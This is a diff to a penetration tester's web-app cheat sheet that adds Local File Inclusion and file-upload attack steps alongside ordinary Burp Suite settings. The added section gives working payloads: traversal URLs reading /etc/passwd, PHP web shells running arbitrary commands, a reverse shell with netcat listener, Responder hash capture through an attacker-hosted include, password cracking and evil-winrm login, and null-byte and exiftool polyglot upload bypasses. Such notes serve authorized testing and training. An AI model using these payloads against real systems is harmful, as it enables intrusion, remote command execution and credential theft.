@@ -208,29 +208,53 @@ nc -lvnp 8000
 
 # Local File Inclusion
 
-An attacker is able manipulate a parameter in the URL to get the website to include a file that was not intended to be an option for the application.
+A web server allows a user to upload files without sufficiently validating the name, content, type, or size.
+After the file has been upload, an HTTP request for the file is used to trigger its execution by the web server.
 
-- Example 1:
+An attacker is able manipulate a parameter in the URL to get the web server to display a file that was not intended.
+
+- Example 1
 Use ../ to traverse directories and read sensitive files.
-Linux: http://target.com/index.php?page=/etc/passwd
+Linux: http://target.com/index.php?page=../../../etc/passwd
 Windows: http://target.com/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
 
-- Example 2:
+- Example 2
 While adding a new entry in an address book web app, instead of uploading a photo, upload a web shell.
+A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server
+by sending HTTP requests to a particular location.
+
+Create read.php and upload it to the server.
+<?php echo file_get_contents('/etc/passwd'); ?>
+Use Burp Repeater to call the file.
+GET /files/uploads/read.php HTTP/1.1
+
+Create command.php and upload it to the server.
+<?php echo system($_GET['command']); ?>
+Use Burp Repeater to call the file.
+GET /files/uploads/command.php HTTP/1.1
+
+- Example 3
 cp /usr/share/webshells/php/php-reverse-shell.php .
 Edit the file by changing the IP and port.
-Use gobuster to bruteforce directories to find where the shell may have uploaded to.
+Use gobuster to brute force directories to find where the shell may have uploaded to.
 nc -lvnp 443
 http://target IP/uploads/php-reverse-shell.php
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 
-- Example 3:
+- Example 4
 cd /opt/Responder
 python3 Responder.py -I eth0
 http://target.com/index.php?page=//attacker IP/test
 Copy the account and hash to a file.
 john -w=/usr/share/wordlists/rockyou.txt <Responder hash>
 evil-winrm -i <target IP> -u <user> -p <password>
+
+- Bypass filtering
+Change the specified Content-Type to image/jpeg.
+Add a null byte and another file extension to the filename: shell.php%00.jpg
+
+Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata.
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" photo.jpg -o polyglot.php
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # PHP Version
@@ -382,8 +406,8 @@ Intruder > Options > Request Engine
 User options > Connections > Platform Authentication > enable Prompt for credentials on platform authentication failure
 
 User options > Display
-    User Interface > Font size: 16
-    HTTP Message Display > Font: Courier 18
+    User Interface > Font size: 15
+    HTTP Message Display > Font: Courier 15
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Testing from home? Proxy your web traffic through a remote server.
@@ -419,7 +443,7 @@ The IP address should be your remote Kali box.
 Target > Site map: this should now populate
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-- New scan
+- Create a new Burp project
 Start Burp > Open existing project: uncheck Pause Automated Tasks
 New project on disk
 Enter a name
@@ -429,9 +453,9 @@ Tab > rename the file if needed > Next > Start Burp
 Proxy > turn off the Intercept
 Open browser > browse to the target site
 Target > Site map: this should be populating
-Right click on the target URL > Add to scope
-Proxy history logging: Yes
-Filter bar > enable Show only in-scope items
+Right click on the target URL > Add to scope > Yes
+Right click on the target URL > Expand branch
+Select Issues in the top right pane.
 
 - Browse the target
 Look for /robots.txt and /sitemap
